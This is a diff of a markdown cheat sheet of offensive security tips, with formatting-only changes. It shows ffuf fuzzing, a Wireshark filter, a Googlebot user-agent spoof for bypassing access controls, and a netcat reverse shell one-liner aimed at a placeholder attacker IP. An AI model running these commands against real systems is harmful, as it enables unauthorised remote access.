@@ -61,12 +61,13 @@ Great for uncovering hidden configurations or malicious scripts.
 - Fast directory scanning with FFUF:
   ```
   ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .php,.html,.txt -o output.txt
-
   ```
 Quick and powerful fuzzing to discover hidden directories.
+
 ### 🚀 2. Hidden Gems in Wireshark
 
 - Capture only HTTP GET requests:
+
 ```
 http.request.method == "GET"
 ```
@@ -93,7 +94,9 @@ curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
 Impersonate a search engine crawler to bypass access restrictions.
 
 ### 🛡️ 4. Advanced Reverse Shells
+
 - Obfuscated Netcat reverse shell:
+
 ```
 mkfifo /tmp/lolpipe; nc <attacker IP> <port> 0</tmp/lolpipe | /bin/sh >/tmp/lolpipe 2>&1; rm /tmp/lolpipe
 ```
